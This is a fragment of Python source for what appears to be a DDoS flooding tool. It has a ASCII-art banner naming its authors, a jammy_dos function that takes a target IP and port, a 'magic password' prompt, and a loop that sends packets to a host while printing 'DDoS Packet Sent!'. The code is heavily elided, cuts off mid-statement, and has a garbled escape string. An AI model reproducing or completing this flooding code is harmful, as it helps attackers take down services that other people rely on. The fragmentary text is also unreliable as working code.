...
RESET = "\033[0m"
BRIGHT = '\033[1m'
def jammy_dos(ip, port=80, turbo=200):
    while True:
        input_id = input("\033[1;34;40m Enter magic password: ")
    ...
    |_ \ /  \|  V  |  V  \ `v' / | _\ /__\ /' _/ 
     _\ | /\ | \_/ | \_/ |`. .'  | v | \/ |`._`.   {GREEN}version: stable{RED}
    /___|_||_|_| |_|_| |_| !_!   |__/ \__/ |___/   {GREEN}authors: fl0ck4hh, akhan{RED}
    __________________________________________________________________________________
                    ...
                    while True:
                        ...
                        if s.sendto(packet, (host, int(port))):
                            ...
                            print("\033[92m", time.ctime(time.time()),
                                "\033[0m \033[94m DDoS Packet Sent! \033[0m")
                        else:
                            s.shutdown(1)
                            print("\033[91Ez\033[0m")
                        time.sleep(.1)
            ...
            print("\033[94mInitiating the attack...\033[0m")
            user_agent()
            my_bots()
            time.sleep(5)
            try:
